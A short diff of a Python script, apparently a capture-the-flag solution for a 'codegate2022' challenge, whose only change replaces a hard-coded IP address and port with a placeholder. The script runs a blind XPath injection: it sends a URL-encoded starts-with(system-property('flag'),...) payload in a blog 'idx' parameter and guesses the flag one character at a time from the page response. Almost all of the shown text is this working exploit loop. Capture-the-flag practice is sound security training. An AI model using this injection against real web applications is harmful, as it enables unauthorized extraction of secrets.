@@ -21,7 +21,7 @@ flag = ''
 
 for i in range(34+len('codegate2022')):
     for x in ascii_lowercase+digits+'{}':
-        conn = requests.get('http://42.192.137.212:1233/blog/read?idx=1%27%20and%20starts-with(system-property(%27flag%27),%27'+flag+x+'%27)%20and%271%27=%271', cookies=SESSION)
+        conn = requests.get('http://url/blog/read?idx=1%27%20and%20starts-with(system-property(%27flag%27),%27'+flag+x+'%27)%20and%271%27=%271', cookies=SESSION)
         r1 = conn.text
         if 'test' in r1:
             flag += x
